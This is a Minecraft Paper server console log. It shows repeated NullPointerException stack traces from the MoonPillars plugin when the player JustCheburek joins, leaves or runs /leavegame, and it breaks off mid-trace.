[14:10:32] [Server thread/ERROR]: Could not pass event PlayerQuitEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.onLeave(GameManager.java:986) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor222.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:605) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.players.PlayerList.remove(PlayerList.java:590) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.removePlayerFromWorld(ServerGamePacketListenerImpl.java:2036) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2016) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.onDisconnect(ServerGamePacketListenerImpl.java:2003) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.Connection.handleDisconnection(Connection.java:902) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConnectionListener.tick(ServerConnectionListener.java:262) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickChildren(MinecraftServer.java:1823) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.dedicated.DedicatedServer.tickChildren(DedicatedServer.java:473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.tickServer(MinecraftServer.java:1598) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1304) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:10:32] [Server thread/INFO]: [MoonPillars] [STDOUT] DELETE Response: Offline player deleted successfully.
[14:10:33] [Server thread/INFO]: [NoChatReports] Forgetting player: JustCheburek
[14:10:42] [User Authenticator #3/INFO]: UUID of player JustCheburek is 168fa541-313e-44b2-beaa-5bebf9595e28
[14:10:52] [Server thread/ERROR]: Could not pass event PlayerJoinEvent to MoonPillars v5.2.2
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.MoonLab.OnJoin(MoonLab.java:98) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor202.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:80) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:131) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:628) ~[paper-api-1.21-R0.1-SNAPSHOT.jar:?]
	at net.minecraft.server.players.PlayerList.placeNewPlayer(PlayerList.java:347) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerConfigurationPacketListenerImpl.handleConfigurationFinished(ServerConfigurationPacketListenerImpl.java:173) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.configuration.ServerboundFinishConfigurationPacket.handle(ServerboundFinishConfigurationPacket.java:22) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.configuration.ServerboundFinishConfigurationPacket.handle(ServerboundFinishConfigurationPacket.java:13) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.network.protocol.PacketUtils.lambda$ensureRunningOnSameThread$0(PacketUtils.java:56) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:10:52] [Server thread/INFO]: [NoChatReports] Setting up player: JustCheburek
[14:10:52] [Server thread/INFO]: JustCheburek[/109.126.59.118:54012] logged in with entity id 34 at ([world]-75.5, 111.0, -16.5)
[14:10:58] [Server thread/INFO]: JustCheburek issued server command: /joingame random
[14:11:11] [Server thread/INFO]: JustCheburek issued server command: /execute in minecraft:mini-clouds-1 run tp 0 ~ 0
[14:11:11] [Server thread/INFO]: [JustCheburek: Teleported JustCheburek to 0.500000, 111.000000, 0.500000]
[14:11:14] [Server thread/INFO]: JustCheburek issued server command: /gamemode creative
[14:11:20] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Crafting
[14:11:20] [Server thread/WARN]: No config found for player: JustCheburek
[14:11:40] [Server thread/INFO]: JustCheburek issued server command: /joingame random
[14:11:42] [Server thread/INFO]: Inventory click by JustCheburek in inventory: Crafting
[14:11:42] [Server thread/WARN]: No config found for player: JustCheburek
[14:11:56] [Server thread/INFO]: JustCheburek issued server command: /leavegame
[14:11:56] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:11:56] [Server thread/ERROR]: Command exception: /leavegame
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.MenuManager.executeCommands(MenuManager.java:314) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager.processCommandArguments(CommandManager.java:136) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager$1.execute(CommandManager.java:59) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at io.papermc.paper.command.brigadier.bukkit.BukkitCommandNode$BukkitBrigCommand.run(BukkitCommandNode.java:91) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at com.mojang.brigadier.context.ContextChain.runExecutable(ContextChain.java:73) ~[brigadier-1.2.9.jar:?]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:31) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:19) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.UnboundEntryAction.lambda$bind$0(UnboundEntryAction.java:8) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.CommandQueueEntry.execute(CommandQueueEntry.java:5) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.ExecutionContext.runCommandQueue(ExecutionContext.java:103) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.executeCommandInContext(Commands.java:443) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:350) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:337) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:332) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.performUnsignedChatCommand(ServerGamePacketListenerImpl.java:2147) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.lambda$handleChatCommand$11(ServerGamePacketListenerImpl.java:2121) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:15:39] [Server thread/INFO]: JustCheburek issued server command: /joingame random
[14:15:46] [Server thread/INFO]: JustCheburek issued server command: /joingame random
[14:15:49] [Server thread/INFO]: JustCheburek issued server command: /leavegame
[14:15:49] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:15:49] [Server thread/ERROR]: Command exception: /leavegame
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.MenuManager.executeCommands(MenuManager.java:314) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager.processCommandArguments(CommandManager.java:136) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager$1.execute(CommandManager.java:59) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at io.papermc.paper.command.brigadier.bukkit.BukkitCommandNode$BukkitBrigCommand.run(BukkitCommandNode.java:91) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at com.mojang.brigadier.context.ContextChain.runExecutable(ContextChain.java:73) ~[brigadier-1.2.9.jar:?]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:31) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:19) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.UnboundEntryAction.lambda$bind$0(UnboundEntryAction.java:8) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.CommandQueueEntry.execute(CommandQueueEntry.java:5) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.ExecutionContext.runCommandQueue(ExecutionContext.java:103) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.executeCommandInContext(Commands.java:443) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:350) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:337) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:332) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.performUnsignedChatCommand(ServerGamePacketListenerImpl.java:2147) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.lambda$handleChatCommand$11(ServerGamePacketListenerImpl.java:2121) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:15:51] [Server thread/INFO]: JustCheburek issued server command: /joingame random
[14:15:53] [Server thread/INFO]: JustCheburek issued server command: /leavegame
[14:15:53] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:15:53] [Server thread/ERROR]: Command exception: /leavegame
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.MenuManager.executeCommands(MenuManager.java:314) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager.processCommandArguments(CommandManager.java:136) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager$1.execute(CommandManager.java:59) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at io.papermc.paper.command.brigadier.bukkit.BukkitCommandNode$BukkitBrigCommand.run(BukkitCommandNode.java:91) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at com.mojang.brigadier.context.ContextChain.runExecutable(ContextChain.java:73) ~[brigadier-1.2.9.jar:?]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:31) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:19) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.UnboundEntryAction.lambda$bind$0(UnboundEntryAction.java:8) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.CommandQueueEntry.execute(CommandQueueEntry.java:5) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.ExecutionContext.runCommandQueue(ExecutionContext.java:103) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.executeCommandInContext(Commands.java:443) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:350) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:337) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:332) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.performUnsignedChatCommand(ServerGamePacketListenerImpl.java:2147) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.lambda$handleChatCommand$11(ServerGamePacketListenerImpl.java:2121) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:125) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1514) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1507) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:135) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.managedBlock(MinecraftServer.java:1466) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1473) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1318) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:330) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at java.base/java.lang.Thread.run(Thread.java:1583) ~[?:?]
[14:15:54] [Server thread/INFO]: JustCheburek issued server command: /leavegame
[14:15:54] [Server thread/INFO]: [MineBridge] Вы поменяли гм на SURVIVAL для JustCheburek
[14:15:54] [Server thread/ERROR]: Command exception: /leavegame
java.lang.NullPointerException: Cannot invoke ""org.bukkit.configuration.ConfigurationSection.getKeys(boolean)"" because the return value of ""org.bukkit.configuration.file.FileConfiguration.getConfigurationSection(String)"" is null
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.InventoryItemAPI.GiveLobbyItems(InventoryItemAPI.java:38) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.FinalLeaveGame(GameManager.java:1108) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.GameAPI.GameManager.leaveGame(GameManager.java:1069) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.MenuManager.executeCommands(MenuManager.java:314) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager.processCommandArguments(CommandManager.java:136) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at MoonPillars-PaperMC-5.2.2.jar/org.kloppie74.MoonPillars.PaperMC.UltimateGuis.CommandManager$1.execute(CommandManager.java:59) ~[MoonPillars-PaperMC-5.2.2.jar:?]
	at io.papermc.paper.command.brigadier.bukkit.BukkitCommandNode$BukkitBrigCommand.run(BukkitCommandNode.java:91) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at com.mojang.brigadier.context.ContextChain.runExecutable(ContextChain.java:73) ~[brigadier-1.2.9.jar:?]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:31) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.tasks.ExecuteCommand.execute(ExecuteCommand.java:19) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.UnboundEntryAction.lambda$bind$0(UnboundEntryAction.java:8) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.CommandQueueEntry.execute(CommandQueueEntry.java:5) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.execution.ExecutionContext.runCommandQueue(ExecutionContext.java:103) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.executeCommandInContext(Commands.java:443) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:350) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:337) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.commands.Commands.performCommand(Commands.java:332) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.performUnsignedChatCommand(ServerGamePacketListenerImpl.java:2147) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.lambda$handleChatCommand$11(ServerGamePacketListenerImpl.java:2121) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:151) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1537) ~[paper-1.21.jar:1.21-127-4e6a2a1]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:201) ~[paper-1.21.jar:1.21-127-4e6a2a1]
